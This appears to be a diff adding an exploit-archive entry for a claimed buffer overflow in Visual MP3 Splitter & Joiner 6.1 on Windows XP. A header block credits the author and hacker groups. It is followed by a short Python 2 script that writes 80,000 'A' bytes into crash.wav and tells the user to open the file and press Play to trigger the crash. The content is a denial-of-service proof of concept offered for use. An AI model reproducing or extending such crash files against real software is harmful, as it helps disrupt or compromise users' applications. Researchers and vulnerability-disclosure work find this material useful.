@@ -1,0 +1,27 @@
+#Title: Visual MP3 Splitter & Joiner 6.1 (.wav) Buffer Overflow Vulnerability
+
+#Author    :   anT!-Tr0J4n
+
+#Email      :   D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com
+
+#Greetz    :   Dev-PoinT.com ; GlaDiatOr,SILVER STAR , HoBeeZ, Coffin Of Evil
+
+#special thanks    :   r0073r,Sid3^effects,L0rd CruSad3r,SeeMe,Sonic,gunslinger_,Sn!pEr.S!Te,n4pst3rr,indoushka, KnocKout,SONiC,ZoRLu 
+
+#Home     :   www.Dev-PoinT.com  $ Inj3ct0r.com $ http://milw0rm.ws
+
+#Software :  http://www.ManiacTools.com
+
+#Tested on:   Windows XP sp3
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+#!/usr/bin/python
+#Home : www.Dev-PoinT.com , Inj3ct0r.com
+outfile="crash.wav"
+junk="\x41" * 80000
+FILE=open(outfile, "w")
+FILE.write(junk)
+FILE.close()
+print ''' File created succesufully , open  it with Visual MP3 Splitter and press the Play button '''
